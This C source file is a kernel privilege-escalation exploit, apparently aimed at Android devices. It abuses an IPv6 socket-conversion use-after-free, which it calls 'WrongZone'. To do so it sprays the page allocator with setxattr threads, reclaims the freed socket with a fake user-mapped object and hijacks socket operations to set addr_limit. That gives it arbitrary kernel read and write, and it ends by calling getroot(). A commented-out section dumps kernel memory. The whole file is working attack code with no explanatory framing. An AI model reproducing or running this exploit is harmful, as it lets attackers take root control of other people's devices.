#define _GNU_SOURCE
#include <errno.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>

#include <arpa/inet.h>
#include <sys/mman.h>
#include <sys/xattr.h>

#include "device.h"

#define T 8
#define PAGE_SIZE 4096
#define STACK_SIZE (T * PAGE_SIZE)
#define THREADS 7
#define SPRAY 66
#define DUPS 300

int read_at_address_pipe(void *address, void *buf, size_t len);
int write_at_address_pipe(void *address, void *buf, size_t len);
int getroot();

char buf[STACK_SIZE];
void *stacking(void *evil_mem)
{
    while (1)
    {
        setxattr("/data/local/tmp", "user.test", buf, STACK_SIZE, XATTR_REPLACE);
    }
}

int main(int argc, char *argv[])
{
    setbuf(stdout, NULL);

    printf("[*] Preparing the evil memory page\n");
    void *evil_mem = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (evil_mem == (void *)0xffffffffffffffff)
    {
        printf("mmap failed %s\n", strerror(errno));
        return 0;
    }

    for (int i = 0; i < PAGE_SIZE; i++)
        *(char *)(evil_mem + i) = '\0';
    *(uint64_t *)evil_mem = 0xdeadbeefdeadbeef;

    for (int i = 0; i < STACK_SIZE / 8; ++i)
        *(uint64_t *)(buf + 8 * i) = (uint64_t)evil_mem;

    printf("[*] Starting page allocator spraying threads\n");
    pthread_t threads[THREADS];
    for (int i = 0; i < THREADS; i++)
    {
        int ret = pthread_create(&threads[i], NULL, stacking, evil_mem);
        if (ret != 0)
        {
            printf("pthread_create failed: %d\n", ret);
            return 0;
        }
    }

    printf("[*] Setting CPU affinity to pin on core #0\n");
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(0, &mask);
    if (sched_setaffinity(0, sizeof(mask), &mask) != 0)
    {
        printf("sched_setaffinity failed\n");
        return 0;
    }

    printf("[*] Creating the WrongZone socket\n");
    int fd = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
    int new_fd, newest_fd, client_fd;
    struct sockaddr_in6 bind_addr;
    struct sockaddr_in bind_addr4, client_addr1, client_addr2;
    struct sockaddr unsp;
    int val;

    memset(&bind_addr, 0, sizeof(bind_addr));
    bind_addr.sin6_family = AF_INET6;
    bind_addr.sin6_port = ntohs(42424);

    memset(&client_addr1, 0, sizeof(client_addr1));
    client_addr1.sin_family = AF_INET;
    client_addr1.sin_port = ntohs(42424);
    client_addr1.sin_addr.s_addr = inet_addr("127.0.0.1");

    memset(&client_addr2, 0, sizeof(client_addr2));
    client_addr2.sin_family = AF_INET;
    client_addr2.sin_port = ntohs(42421);
    client_addr2.sin_addr.s_addr = inet_addr("127.0.0.1");

    memset(&unsp, 0, sizeof(unsp));
    unsp.sa_family = AF_UNSPEC;

    bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr));

    listen(fd, 5);

    client_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    connect(client_fd, (struct sockaddr *)&client_addr1, sizeof(client_addr1));
    new_fd = accept(fd, NULL, NULL);
    //close(fd);

    val = AF_INET;
    setsockopt(new_fd, SOL_IPV6, IPV6_ADDRFORM, &val, sizeof(val));

    connect(new_fd, &unsp, sizeof(unsp));

    memset(&bind_addr4, 0, sizeof(bind_addr4));
    bind_addr4.sin_family = AF_INET;
    bind_addr4.sin_port = ntohs(42421);
    bind(new_fd, (struct sockaddr *)&bind_addr4, sizeof(bind_addr4));

    listen(new_fd, 5);

    client_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    int run_out_sk[SPRAY];
    for (int i = 0; i < SPRAY; ++i)
        run_out_sk[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    int defrag_sk[T];
    for (int i = 0; i < T; i++)
        defrag_sk[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    connect(client_fd, (struct sockaddr *)&client_addr2, sizeof(client_addr2));
    newest_fd = accept(new_fd, NULL, NULL);

    int wrongzone_sk = newest_fd;
    int follow_sk = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    int fill_sk[T];
    for (int i = 0; i < T; i++)
        fill_sk[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    printf("[*] Freeing the WrongZone socket\n");
    close(wrongzone_sk);

    for (int i = 0; i < T; i++)
        close(defrag_sk[i]);

    for (int i = 0; i < T; i++)
        close(fill_sk[i]);

    printf("[*] Creating the duplicate sockets\n");
    int evil_sk = -1;
    for (int i = 0; i < DUPS; ++i)
    {
        int sk = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
        if (*(uint64_t *)evil_mem != 0xdeadbeefdeadbeef)
        {
            evil_sk = sk;
            break;
        }
    }

    if (evil_sk < 0)
    {
        printf("[!] Failed to control the allocation\n");
        return 0;
    }
    printf("[*] Successfully controlled the allocation\n");

    printf("[*] Stopping page allocator spraying threads\n");
    for (int i = 0; i < THREADS; i++)
        pthread_kill(threads[i], 0);

    /*int offset = 0;
    char page[PAGE_SIZE];
    memcpy(page, evil_mem, PAGE_SIZE);

    if (setsockopt(evil_sk, SOL_TCP, TCP_CONGESTION, "reno", strlen("reno") + 1) < 0) {
        printf("failed to setsockopt TCP_CONGESTION\n");
        return 0;
    }

    for (int i = 0; i < PAGE_SIZE; i += 8) {
        uint64_t old = *(uint64_t*)(page + i);
        uint64_t new = *(uint64_t*)(evil_mem + i);
        if (old != new
                && ((old & 0xffffff0000000000) == 0xffffff0000000000)
                && ((new & 0xffffff0000000000) == 0xffffff0000000000)) {
            offset = i;
            break;
        }
    }

    if (offset == 0) {
        printf("offset not found\n");
        return 0;
    }
    printf("offset = 0x%x\n", offset);

    *(uint64_t *)(evil_mem + offset) = (uint64_t)evil_mem + 0xf00;
    for (int i = 0; i < 0x100; i++) {
        *(uint8_t *)(evil_mem + 0xf00 + i) = (uint8_t)i;
    }

    char data[16];
    memset(data, 0, 16);
    socklen_t data_len = 16;
    getsockopt(evil_sk, SOL_TCP, TCP_CONGESTION, data, &data_len);

    int offset2 = (uint8_t)data[0];
    if (offset2 == 0) {
        printf("offset2 not found\n");
        return 0;
    }
    printf("offset2 = 0x%x\n", offset2);

    for (uint64_t addr = DUMP_BEG; addr < DUMP_END; addr += 16) {
        memset(data, 0, 16);
        data_len = 16;
        *(uint64_t *)(evil_mem + offset) = addr - offset2;
        getsockopt(evil_sk, SOL_TCP, TCP_CONGESTION, data, &data_len);
        
        printf("%lx: ", addr);
        for (int i = 0; i < 16; ++i)
            printf("%02x", (uint8_t)data[i]);
        printf("\n");
    }*/

    printf("[*] Setting addr_limit to -1 using kernel_sock_ioctl\n");
    *(uint64_t *)(evil_mem + OFFSETOF_SKC_PROT) = (uint64_t)evil_mem + 0x800;
    *(uint64_t *)(evil_mem + 0x800 + OFFSETOF_IOCTL) = (uint64_t)KERNEL_GETSOCKOPT + 4;
    *(uint64_t *)(evil_mem + 0x800 + OFFSETOF_GETSOCKOPT) = (uint64_t)INET6_IOCTL_END - 4;

    int answ;
    ioctl(evil_sk, 0x541B, NULL);

    uint64_t tester;
    read_at_address_pipe((void *)TESTER, &tester, sizeof(uint64_t));
    printf("[*] Testing kernel R/W: 0x%lx\n", tester);

    pid_t pid = fork();
    if (pid == 0)
    {
        printf("[*] Child thread entering an infinite loop\n");
        int i = 0;
        while (1)
        {
            i += 1;
        }
        printf("i = %d\n", i);
    }
    else
    {
        getroot();
    }
    return 0;
}
